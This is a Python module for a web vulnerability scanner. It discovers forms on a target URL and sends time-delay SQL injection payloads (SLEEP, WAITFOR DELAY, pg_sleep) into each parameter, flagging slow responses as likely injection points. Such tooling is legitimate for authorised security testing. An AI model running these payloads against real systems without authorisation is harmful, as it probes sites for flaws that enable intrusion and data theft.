import requests, time, os
from .form_discover import discover_forms

class SQLiTimeScanner:
    name = 'Time-based SQLi Scanner'
    TIME_PAYLOADS = [
        "1 OR SLEEP(5)-- ",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1 OR pg_sleep(5)--"
    ]
    def __init__(self, url, timeout=8):
        self.url = url
        self.timeout = timeout
        params_file = os.path.join('scanner','parameters','sqli_params.txt')
        if os.path.exists(params_file):
            with open(params_file) as f:
                self.priority = [ln.strip() for ln in f if ln.strip() and not ln.startswith('#')]
        else:
            self.priority = ['id','q']

    def run(self):
        findings = []
        forms = discover_forms(self.url)
        candidates = list(self.priority)
        for f in forms:
            for inp in f.get('inputs', []):
                if inp['name'] not in candidates:
                    candidates.append(inp['name'])
        candidates = list(dict.fromkeys(candidates))
        targets = []
        if forms:
            for f in forms:
                targets.append({'action': f['full_action'], 'method': f['method'], 'inputs': f['inputs']})
        else:
            targets.append({'action': self.url, 'method': 'get', 'inputs': []})

        for p in self.TIME_PAYLOADS:
            for t in targets:
                if t['inputs']:
                    for inp in t['inputs']:
                        params = {}
                        for i in t['inputs']:
                            params[i['name']] = i.get('value','') or '1'
                        params[inp['name']] = p
                        try:
                            start = time.time()
                            if t['method'] == 'post':
                                requests.post(t['action'], data=params, timeout=self.timeout)
                            else:
                                requests.get(t['action'], params=params, timeout=self.timeout)
                            elapsed = time.time() - start
                            if elapsed > 4.0:
                                findings.append({'payload': p, 'endpoint': t['action'], 'param': inp['name'], 'elapsed': elapsed})
                        except requests.exceptions.ReadTimeout:
                            findings.append({'payload': p, 'endpoint': t['action'], 'param': inp['name'], 'reason': 'timeout'})
                        except Exception:
                            continue
                else:
                    for c in candidates:
                        params = {c: p}
                        try:
                            start = time.time()
                            requests.get(t['action'], params=params, timeout=self.timeout)
                            elapsed = time.time() - start
                            if elapsed > 4.0:
                                findings.append({'payload': p, 'endpoint': t['action'], 'param': c, 'elapsed': elapsed})
                        except requests.exceptions.ReadTimeout:
                            findings.append({'payload': p, 'endpoint': t['action'], 'param': c, 'reason': 'timeout'})
                        except Exception:
                            continue
        return findings
